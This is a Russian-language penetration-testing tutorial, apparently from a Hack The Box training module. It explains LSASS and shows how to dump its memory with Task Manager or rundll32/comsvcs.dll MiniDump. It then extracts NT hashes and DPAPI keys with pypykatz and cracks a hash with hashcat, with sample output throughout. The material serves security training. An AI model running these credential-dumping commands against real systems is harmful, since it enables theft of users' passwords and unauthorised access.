Помимо получения копий базы данных SAM для извлечения и взлома хэшей паролей, мы также сможем использовать [подсистему локального управления безопасностью (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) . Как уже рассматривалось в `Credential Storage`этом модуле, LSASS — это основной процесс Windows, отвечающий за обеспечение соблюдения политик безопасности, обработку аутентификации пользователей и хранение конфиденциальных учетных данных в памяти.

![Схема процесса аутентификации Windows, демонстрирующая взаимодействие между WinLogon.exe, lsass.exe, пакетами аутентификации, NTLM и Kerberos.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/lsassexe_diagram.png)

При первом входе в систему LSASS выполнит следующие действия:

- Кэшировать учетные данные локально в памяти.
- Создать [токены доступа](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- Обеспечивать соблюдение политик безопасности.
- [Запись в журнал безопасности](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security) Windows[](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

Рассмотрим некоторые методы и инструменты, которые можно использовать для дампа памяти LSASS и извлечения учетных данных с целевого устройства под управлением Windows.

## Выгрузка дампа памяти процесса LSASS.

Аналогично процессу атаки на базу данных SAM, сначала было бы разумно создать копию содержимого памяти процесса LSASS, сгенерировав дамп памяти. Создание файла дампа позволяет извлечь учетные данные в автономном режиме, используя наш хост для атаки. Следует помнить, что проведение атак в автономном режиме обеспечивает большую гибкость в скорости атаки и требует меньше времени на целевой системе. Существует множество методов создания дампа памяти, поэтому давайте рассмотрим методы, которые можно выполнить с помощью инструментов, уже встроенных в Windows.

#### Метод диспетчера задач

Имея доступ к интерактивному графическому интерфейсу целевого устройства, мы можем использовать диспетчер задач для создания дампа памяти. Для этого нам потребуется:

1. Открыть`Task Manager`
2. Выберите `Processes`вкладку
3. Найдите и щелкните правой кнопкой мыши по`Local Security Authority Process`
4. Выбирать`Create dump file`

![Диспетчер задач отображает процесс локального центра управления безопасностью с открытым контекстным меню, выделяющим опцию «Создать файл дампа», и файл lsass.DMP в результатах поиска.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/taskmanagerdump.png)

`lsass.DMP`Создается и сохраняется файл с именем `%temp%`. Именно этот файл мы будем передавать на наш хост для атаки. Для передачи файла дампа на наш хост для атаки мы можем использовать метод передачи файлов, описанный в предыдущем разделе этого модуля.

#### Метод Rundll32.exe и Comsvcs.dll

Метод с использованием диспетчера задач зависит от наличия интерактивного сеанса с целевым объектом через графический интерфейс. Альтернативный метод — дамп памяти процесса LSASS с помощью утилиты командной строки [rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32) — также полезен. Этот способ быстрее и гибче, поскольку позволяет получить доступ к командной оболочке на хосте Windows, имея доступ только к командной строке. Важно отметить, что современные антивирусные программы распознают этот метод как вредоносную активность.

Перед тем как отдать команду на создание файла дампа, необходимо определить, какой идентификатор процесса ( `PID`) назначен процессу `lsass.exe`. Это можно сделать из командной строки или PowerShell:

#### Как найти PID LSASS в командной строке

Из командной строки мы можем ввести команду `tasklist /svc`для поиска `lsass.exe`и получения идентификатора процесса.

  Атака на LSASS

```cmd-session
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
```

#### Как найти PID LSASS в PowerShell

В PowerShell мы можем выполнить команду `Get-Process lsass`и увидеть идентификатор процесса в соответствующем `Id`поле.

  Атака на LSASS

```powershell-session
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

После того как мы получим PID, присвоенный процессу LSASS, мы сможем создать файл дампа.

#### Создание файла дампа с помощью PowerShell

Используя права администратора в сеансе PowerShell, мы можем выполнить следующую команду для создания файла дампа:

  Атака на LSASS

```powershell-session
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

Эта команда `rundll32.exe`вызывает экспортируемую функцию , `comsvcs.dll`которая также вызывает функцию MiniDumpWriteDump( `MiniDump`) для выгрузки данных из памяти процесса LSASS в указанный каталог `C:\lsass.dmp`. Напомним, что большинство современных антивирусных программ распознают это как вредоносную активность и блокируют выполнение команды. В таких случаях нам потребуется рассмотреть способы обхода или отключения антивирусной программы. Методы обхода антивирусов выходят за рамки данного модуля.

Если нам удастся выполнить эту команду и сгенерировать `lsass.dmp`файл, мы сможем перенести его на наш сервер для атаки, чтобы попытаться извлечь любые учетные данные, которые могли храниться в памяти процесса LSASS.

**Примечание:** Для передачи файла lsass.dmp с целевого объекта на хост для атаки можно использовать метод передачи файлов, описанный в разделе «Атака на SAM».

## Использование Pypykatz для извлечения учетных данных

Получив дамп-файл на нашем атакующем хосте, мы можем использовать мощный инструмент под названием [pypykatz](https://github.com/skelsec/pypykatz) для извлечения учетных данных из `.dmp`файла. Pypykatz — это реализация Mimikatz, полностью написанная на Python. Тот факт, что она написана на Python, позволяет запускать ее на атакующих хостах под управлением Linux. На момент написания этой статьи Mimikatz работает только на системах Windows, поэтому для его использования нам потребуется либо использовать атакующий хост под управлением Windows, либо запускать Mimikatz непосредственно на целевом устройстве, что не является идеальным вариантом. Это делает Pypykatz привлекательной альтернативой, поскольку все, что нам нужно, — это копия дамп-файла, и мы можем запустить его в автономном режиме с нашего атакующего хоста под управлением Linux.

Напомним, что LSASS хранит учетные данные, имеющие активные сеансы входа в систему Windows. Когда мы выгрузили данные из памяти процесса LSASS в файл, мы, по сути, сделали «снимок» того, что находилось в памяти в тот момент времени. Если существовали какие-либо активные сеансы входа в систему, учетные данные, использованные для их установления, будут присутствовать. Давайте запустим Pypykatz на файле дампа и выясним это.

#### Running Pypykatz

Эта команда запускает использование `pypykatz`для анализа секретов, скрытых в дампе памяти процесса LSASS. Мы используем `lsa`в команде, поскольку LSASS является подсистемой `Local Security Authority`, затем указываем источник данных в виде `minidump`файла, а затем путь к файлу дампа, хранящемуся на нашем хосте атаки. Pypykatz анализирует файл дампа и выводит результаты:

  Атака на LSASS

```shell-session
MuraMitchi@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

== LogonSession ==
authentication_id 1354581 (14ab55)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

== LogonSession ==
authentication_id 1343859 (148173)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2021-12-14T18:14:25.248681+00:00
sid S-1-5-90-0-2
luid 1343859
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
```

Давайте подробнее рассмотрим полезную информацию, содержащуюся в выходных данных.

#### MSV

  Атака на LSASS

```shell-session
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) — это пакет аутентификации в Windows , который LSA использует для проверки попыток входа в систему в базе данных SAM. Pypykatz извлек `SID`хеши паролей `Username`, связанные с сеансом входа в систему учетной записи пользователя bob, которые хранятся в памяти процесса LSASS. Это окажется полезным на следующем этапе нашей атаки, описанном в конце этого раздела.`Domain``NT``SHA1`

#### ДАЙДЖЕСТ

  Атака на LSASS

```shell-session
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```

`WDIGEST`LSASS — это более старый протокол аутентификации, включенный по умолчанию в `Windows XP`Windows `Windows 8`и `Windows Server 2003`Windows `Windows Server 2012`. LSASS кэширует учетные данные, используемые WDIGEST, в открытом виде. Это означает, что если мы обнаружим систему Windows с включенным WDIGEST, мы, скорее всего, увидим пароль в открытом виде. В современных операционных системах Windows WDIGEST отключен по умолчанию. Кроме того, важно отметить, что Microsoft выпустила обновление безопасности для систем, затронутых этой проблемой с WDIGEST. Подробности этого обновления безопасности можно изучить [здесь](https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/) .

#### Керберос

  Атака на LSASS

```shell-session
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

[Kerberos](https://web.mit.edu/kerberos/#what_is) — это протокол сетевой аутентификации, используемый Active Directory в средах доменов Windows. Учетным записям пользователей домена выдаются билеты после аутентификации в Active Directory. Этот билет позволяет пользователю получать доступ к общим ресурсам в сети, к которым ему предоставлен доступ, без необходимости каждый раз вводить свои учетные данные. LSASS кэширует `passwords`, `ekeys`, `tickets`, и `pins`связанные с Kerberos данные. Их можно извлечь из памяти процесса LSASS и использовать для доступа к другим системам, подключенным к тому же домену.

#### DPAPI

  Атака на LSASS

```shell-session
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

Mimikatz и Pypykatz могут извлекать DPAPI `masterkey`для авторизованных пользователей, данные которых находятся в памяти процесса LSASS. Затем эти мастер-ключи можно использовать для расшифровки секретов, связанных с каждым из приложений, использующих DPAPI, что приводит к перехвату учетных данных для различных учетных записей. Методы атак с использованием DPAPI более подробно описаны в модуле [«Повышение привилегий в Windows»](https://academy.hackthebox.com/module/details/67) .

#### Взлом NT-хеша с помощью Hashcat

Мы можем использовать Hashcat для взлома NT-хеша. В этом примере мы обнаружили только один NT-хеш, связанный с пользователем Bob. После установки режима в команде мы можем вставить хеш, указать список слов, а затем взломать хеш.

  Атака на LSASS

```shell-session
MuraMitchi@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

Наша попытка взлома завершена, и в целом атаку можно считать успешной.